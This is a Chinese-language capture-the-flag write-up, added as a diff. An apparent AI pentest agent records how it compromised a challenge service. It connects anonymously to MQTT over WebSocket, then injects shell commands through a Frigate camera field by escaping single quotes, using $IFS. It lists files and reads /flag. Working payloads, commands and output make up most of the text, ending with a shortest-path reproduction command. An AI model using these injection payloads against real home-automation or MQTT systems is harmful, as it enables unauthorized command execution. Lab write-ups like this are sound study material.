@@ -1,0 +1,127 @@
+# Undercurrent — 证据链与时间线（scribe）
+
+- 目标：http://<TARGET_HOST>:<TARGET_PORT>
+- 日期：2026-10-31 (UTC)
+- 角色：scribe
+- 结论：MQTT 匿名可连；Frigate 事件 `after.camera` 被家居自动化拼进 shell 命令（单引号包裹），通过单引号逃逸实现命令注入，权限 `homeassistant(103)`，读取 `/flag` 成功。
+
+## FLAG（候选，待人工核对/提交）
+
+```
+flag{OnID0LXdWhQNFIRM47xSPKCbbAcr8TiQaSn8PnHd}
+```
+
+## 1) 指纹与拓扑
+
+命令（web_fetch / pentest-ai http_request）：
+
+```
+GET /health
+```
+
+回显：
+
+```json
+{"ok":true,"service":"stream-test","mqtt_websocket_path":"/mqtt","mqtt_subprotocol":"mqtt","event_topic_pattern":"frigate/+/events","telemetry_topic_pattern":"home/+/telemetry"}
+```
+
+补充：
+- `GET /` -> `{"detail":"Not Found"}`（FastAPI）
+- `GET /redoc` -> 200，HTML 中 `spec-url="/openapi.json"`
+- `GET /openapi.json`、`/docs` -> nginx/1.28.3 404（被前置 nginx 精确拦截，`/OPENAPI.JSON` 反而落到后端 404）
+- `GET /mqtt` 带 `Upgrade: websocket` + `Sec-WebSocket-Protocol: mqtt` -> `HTTP/1.1 101 Switching Protocols`
+
+## 2) MQTT-over-WebSocket 握手 + 匿名连接
+
+本机 pwsh/Python 全部启动失败（exit 3221225794 / 0xC0000142），改用 awd-mcp `run_weapon` 执行自写脚本
+`D:\agent\skill\skills\ctf-0day\scripts\ws_mqtt_probe.py`。
+
+命令：
+
+```
+python ws_mqtt_probe.py --host <TARGET_HOST> --port <TARGET_PORT> --path /mqtt --topics frigate/#,home/# --wait 8
+```
+
+回显（节选）：
+
+```
+HTTP/1.1 101 Switching Protocols
+Sec-WebSocket-Protocol: mqtt
+[CONNACK] return_code=0 (accepted)
+[SUBACK] packet_id=1 codes=[0, 0]
+[PUBLISH] topic=frigate/entry/events payload={"type": "new", "after": {"camera": "--help", "label": "person"}}
+[PUBLISH] topic=home/a78329b80ed46d03/telemetry payload={"camera": "--help", "stdout": "unlock-ok:unlock --camera --help", "stderr": ""}
+```
+
+结论：MQTT 匿名可连（CONNACK rc=0），无需凭据即可订阅 `frigate/+/events`、`home/+/telemetry`。
+
+## 3) 命令注入确认（单引号逃逸）
+
+发布到 `frigate/entry/events`：
+
+```json
+{"type":"new","after":{"camera":"entry';id;'","label":"person"}}
+```
+
+命令：
+
+```
+python ws_mqtt_probe.py --host <TARGET_HOST> --port <TARGET_PORT> --path /mqtt \
+  --topics home/# \
+  --publish 'frigate/entry/events={"type":"new","after":{"camera":"entry'"'"';id;'"'"'","label":"person"}}' \
+  --wait 8
+```
+
+遥测回显：
+
+```json
+{"camera": "entry';id;'", "stdout": "unlock-ok:unlock --camera entry\nuid=103(homeassistant) gid=105(homeassistant) groups=105(homeassistant),105(homeassistant)\nsh: : Permission denied", "stderr": ""}
+```
+
+说明：自动化实际执行形如 `unlock --camera '<camera>'`，单引号闭合后可执行任意命令，输出回显在 `home/a78329b80ed46d03/telemetry`。
+`;id`（不加引号）不执行，证明确实是单引号包裹；`$IFS` 用于规避执行器按空格切分参数。
+
+## 4) 文件系统枚举
+
+```json
+{"type":"new","after":{"camera":"entry';id;ls$IFS-la$IFS/;ls$IFS-la$IFS/app;ls$IFS-la$IFS/config;'","label":"person"}}
+```
+
+回显（节选）：
+
+```
+uid=103(homeassistant) gid=105(homeassistant)
+drwx------ 1 homeassistant homeassistant 4096 Oct 31 17:24 config
+-rw-r--r-- 1 homeassistant homeassistant   47 Oct 31 17:24 flag
+-rwxr-xr-x 1 root root 3870 Oct 29 12:26 service.sh
+ls: /app: No such file or directory
+```
+
+## 5) 读取 /flag
+
+payload：
+
+```json
+{"type":"new","after":{"camera":"entry';cat$IFS/flag;'","label":"person"}}
+```
+
+遥测回显（原文）：
+
+```json
+{"camera": "entry';cat$IFS/flag;'", "stdout": "unlock-ok:unlock --camera entry\nflag{OnID0LXdWhQNFIRM47xSPKCbbAcr8TiQaSn8PnHd}\nsh: : Permission denied", "stderr": ""}
+```
+
+## 复现命令（最短路径）
+
+```bash
+python ws_mqtt_probe.py --host <TARGET_HOST> --port <TARGET_PORT> --path /mqtt \
+  --topics home/# \
+  --publish 'frigate/entry/events={"type":"new","after":{"camera":"entry'"'"';cat$IFS/flag;'"'"'","label":"person"}}' \
+  --wait 8
+```
+
+## 备注
+
+- 本地 shell 故障：所有 pwsh 调用返回 `[exit code: 3221225794]`（0xC0000142 DLL init failed），故全程使用 MCP（pentest-ai http_request / awd-mcp run_weapon）。
+- `ws_mqtt_probe.py` 为本次新增到 ctf-0day scripts 目录的最小 MQTT-over-WS 客户端（团队可复用）。
+- 依纪律：未调用任何平台开环境/提交接口；flag 仅记录，等待人工提交。
